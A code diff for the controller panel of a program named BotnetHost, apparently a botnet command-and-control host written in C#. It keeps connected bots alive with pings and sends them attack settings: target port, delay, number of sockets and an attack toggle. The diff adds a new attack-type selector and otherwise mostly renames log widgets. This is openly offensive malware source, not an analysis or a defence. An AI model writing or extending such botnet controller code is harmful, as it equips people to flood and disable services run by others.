@@ -36,7 +36,8 @@ namespace BotnetHost
         public MainPanel()
         {
             InitializeComponent();
-            this.StyleManager = metroStyleManager1;
+            clientColumn.Width = clientListView.Width - 5;
+            logColumn.Width = logListView.Width - 5;
             serverIPLabel.Text = "IP: " + serverIP;
             serverIPV4Label.Text = "IPV4: " + serverIPV4;
             serverPortLabel.Text = "Port: " + serverPort.ToString();
@@ -125,7 +126,7 @@ namespace BotnetHost
                         clientConnection.restart = false;
                     } else
                     {
-                        log("Pinging client(s)... ");
+                        // Ping clients (check that they are still connected)
                         byte[] message = Encoding.ASCII.GetBytes("ping!");
                         clientConnection.clientSocket.Send(message);
                     }
@@ -135,7 +136,7 @@ namespace BotnetHost
                     Thread.Sleep(1000);
                 } catch (Exception er)
                 {
-                    log("Connection with " + clientConnection.clientName + " has been lost...");
+                    log(clientConnection.clientName + " has been disconnected...");
                     // Kill client
                     try
                     {
@@ -256,11 +257,11 @@ namespace BotnetHost
                     ListViewItem newItem = new ListViewItem();
                     newItem.Text = logMessage;
                     // Use Invoke() to access the log listview from other threads (very big brain)
-                    activityLogListView.Invoke((MethodInvoker)delegate {
+                    logListView.Invoke((MethodInvoker)delegate {
                         // Running on the UI thread
-                        activityLogListView.Items.Add(newItem);
-                        activityLogListView.Columns[0].Width = activityLogListView.Width - 35;
-                        activityLogListView.EnsureVisible(activityLogListView.Items.Count - 1);
+                        logListView.Items.Add(newItem);
+                        logListView.Columns[0].Width = logListView.Width - 35;
+                        logListView.EnsureVisible(logListView.Items.Count - 1);
                     });
                     previousLogMessage = raw;
                 }
@@ -319,8 +320,14 @@ namespace BotnetHost
                 clientConnection.port = int.Parse(metroTextBox2.Text);
                 clientConnection.delay = delayTrackBar.Value;
                 clientConnection.sockets = socketsTrackBar.Value;
-                clientConnection.useSSL = useSSLToggle.Checked;
                 clientConnection.attack = attackingToggle.Checked;
+                if (attackTypeComboBox.Text == "")
+                {
+                    clientConnection.type = attackTypeComboBox.PromptText;
+                } else if (attackTypeComboBox.Text != "")
+                {
+                    clientConnection.type = attackTypeComboBox.Text;
+                }
                 if (!clientConnection.restart)
                 {
                     clientConnection.restart = restartClients;
@@ -504,9 +511,9 @@ namespace BotnetHost
         /// <param name="e"></param>
         private void viewLogMenuItem_Click(object sender, EventArgs e)
         {
-            if (activityLogListView.SelectedItems[0] != null)
+            if (logListView.SelectedItems[0] != null)
             {
-                MessageBox.Show(activityLogListView.SelectedItems[0].Text, "Log Message");
+                MessageBox.Show(logListView.SelectedItems[0].Text, "Log Message");
             }
         }
 
@@ -519,7 +526,7 @@ namespace BotnetHost
         {
             if (e.Button == MouseButtons.Right)
             {
-                var focusedItem = activityLogListView.FocusedItem;
+                var focusedItem = logListView.FocusedItem;
                 if (focusedItem != null && focusedItem.Bounds.Contains(e.Location))
                 {
                     logContextMenu.Show(Cursor.Position);
